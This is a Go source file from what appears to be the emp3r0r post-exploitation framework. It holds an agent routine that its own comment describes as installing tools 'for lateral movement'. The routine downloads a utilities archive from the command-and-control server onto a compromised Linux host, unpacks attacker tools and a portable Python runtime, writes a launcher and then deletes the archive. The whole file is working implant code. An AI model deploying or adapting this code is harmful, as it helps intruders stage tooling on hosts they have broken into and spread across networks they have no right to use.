package agent

/*
install tools to RuntimeConfig.UtilsPath, for lateral movement
*/

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"runtime"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/mholt/archiver"
)

func VaccineHandler() (out string) {
	if runtime.GOOS != "linux" {
		return "Only supported in Linux"
	}

	var (
		PythonArchive = RuntimeConfig.UtilsPath + "/python3.9.tar.xz"
		PythonLib     = RuntimeConfig.UtilsPath + "/python3.9"
		PythonPath    = fmt.Sprintf("%s:%s:%s", PythonLib, PythonLib+"/lib-dynload", PythonLib+"/site-packages")

		// run python scripts with this command
		// LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/home/u/alpine/lib PYTHONPATH="/tmp/python3.9:/tmp/python3.9/site-packages:/tmp/python3.9/lib-dynload" /tmp/python3
		PythonCmd = fmt.Sprintf("PYTHONPATH=%s PYTHONHOME=%s "+
			"LD_LIBRARY_PATH=%s:/usr/lib:/lib:/lib64:/usr/lib64:/usr/lib32 %s ",
			PythonPath, PythonLib,
			emp3r0r_data.LibPath, RuntimeConfig.UtilsPath+"/python3")

		// run python itself with this script
		PythonLauncher = fmt.Sprintf("#!%s\n%s"+`"$@"`+"\n", emp3r0r_data.DefaultShell, PythonCmd)
	)

	log.Printf("Downloading utils from %s", emp3r0r_data.CCAddress+"www/utils.tar.bz2")
	_, err := DownloadViaCC("utils.tar.bz2", RuntimeConfig.AgentRoot+"/utils.tar.bz2")
	out = "[+] Utils have been successfully installed"
	if err != nil {
		log.Print("Utils error: " + err.Error())
		out = "[-] Download error: " + err.Error()
		return
	}

	// unpack utils.tar.bz2 to our PATH
	os.RemoveAll(RuntimeConfig.UtilsPath) // archiver fucking aborts when files already exist
	if !util.IsFileExist(RuntimeConfig.UtilsPath) {
		if err = os.MkdirAll(RuntimeConfig.UtilsPath, 0700); err != nil {
			log.Print(err)
			return fmt.Sprintf("mkdir: %v", err)
		}
	}

	if err = archiver.Unarchive(RuntimeConfig.AgentRoot+"/utils.tar.bz2", RuntimeConfig.UtilsPath); err != nil {
		log.Printf("Unarchive: %v", err)
		return fmt.Sprintf("Unarchive: %v", err)
	}
	os.RemoveAll(emp3r0r_data.LibPath) // archiver fucking aborts when files already exist
	if err = archiver.Unarchive(RuntimeConfig.UtilsPath+"/libs.tar.xz", RuntimeConfig.AgentRoot); err != nil {
		log.Printf("Unarchive: %v", err)
		out = fmt.Sprintf("Unarchive libs: %v", err)
	}

	// extract python3.9.tar.xz
	log.Printf("Pre-set Python environment: %s, %s, %s", PythonArchive, PythonLib, PythonPath)
	os.RemoveAll(PythonLib)
	if util.IsFileExist(PythonArchive) {
		log.Printf("Found python archive at %s, trying to configure", PythonArchive)
		if err = archiver.Unarchive(PythonArchive, RuntimeConfig.UtilsPath); err != nil {
			out = fmt.Sprintf("Unarchive python libs: %v", err)
			log.Print(out)
			return
		}
		// create launchers
		err = ioutil.WriteFile(RuntimeConfig.UtilsPath+"/python", []byte(PythonLauncher), 0755)
		if err != nil {
			out = fmt.Sprintf("Write python launcher: %v", err)
		}
		log.Println("Python configured")
	}
	os.Remove(RuntimeConfig.AgentRoot + "/utils.tar.bz2")

	return
}
